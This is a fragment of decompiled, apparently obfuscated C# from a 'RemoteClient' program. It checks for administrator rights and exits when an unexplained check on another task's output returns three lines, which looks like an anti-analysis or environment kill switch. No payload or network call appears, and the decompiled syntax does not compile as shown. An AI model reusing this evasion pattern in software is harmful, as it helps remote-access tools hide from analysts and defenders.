using System;
using System.Security.Principal;
using RemoteClient.Polices;
using RemoteClient.Tasks;

namespace RemoteClient.Mappers
{
	// Token: 0x0200002A RID: 42
	internal class DescriptorMapper
	{
		// Token: 0x060000BF RID: 191 RVA: 0x000025F9 File Offset: 0x000007F9
		public static bool AddMapper()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x00005B3C File Offset: 0x00003D3C
		private static bool ReadMapper()
		{
			bool result;
			try
			{
				string text = ProcessListenerTask.ViewMapper();
				string[] array = text.Split(new string[]
				{
					"\n"
				}, StringSplitOptions.None);
				if (array.Length == 3)
				{
					result = true;
				}
				else
				{
					result = false;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000C1 RID: 193 RVA: 0x0000260F File Offset: 0x0000080F
		public static void AssetMapper()
		{
			if (DescriptorMapper.ReadMapper())
			{
				Environment.Exit(0);
			}
		}

		// Token: 0x060000C2 RID: 194 RVA: 0x00002297 File Offset: 0x00000497
		public DescriptorMapper()
		{
			InvocationProcessPolicy.CompareError();
			base..ctor();
		}
	}
}
